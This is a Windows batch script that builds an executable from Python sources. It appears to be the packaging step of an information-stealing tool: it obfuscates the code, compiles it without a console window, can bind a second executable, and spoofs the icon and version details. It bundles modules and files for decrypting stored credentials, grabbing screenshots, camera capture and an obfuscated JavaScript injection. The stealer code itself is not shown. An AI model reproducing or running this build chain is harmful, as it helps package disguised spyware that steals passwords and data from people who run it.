@echo off
cls
if not exist activate (
    echo venv not found
    pause
    exit
) else (
    call activate
)
cls
if not exist REQS (
    title Installing requirements...
    pip install -r requirements.txt
    copy /y NUL REQS > NUL
)
cls
title Obfuscating...
python process.py
title Converting to exe...
if exist bound.exe (
    set bound=--add-binary bound.exe;.
) else (
    set bound= 
)
if exist icon.ico (
    set icon=icon.ico
) else (
    set icon=NONE
)
pyinstaller --onefile --clean --noconsole --noconfirm main-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --add-data Camera;. --add-data config.json;. --add-data injection-obfuscated.js;. --add-data getPass;. --version-file version.txt %bound%
if exist dist\ (
    explorer.exe dist
) else (
    echo Building failed!
    pause
)